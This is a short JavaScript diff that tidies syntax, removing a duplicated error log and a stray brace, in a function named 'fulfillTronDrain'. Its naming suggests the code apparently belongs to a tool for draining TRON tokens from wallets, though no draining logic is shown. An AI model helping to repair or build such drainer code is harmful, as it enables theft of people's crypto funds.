@@ -362,9 +362,8 @@ async function fulfillTronDrain(owner, tokenAddress) {
     } catch (e) {
         console.error(`❌ [TRON] Drain Failed:`, e.message);
     }
-    console.error(`❌ [TRON] Drain Failed:`, e.message);
 }
-}
+
 
 // --- EXPLORER HELPER ---
 function getExplorerLink(chain, txHash) {
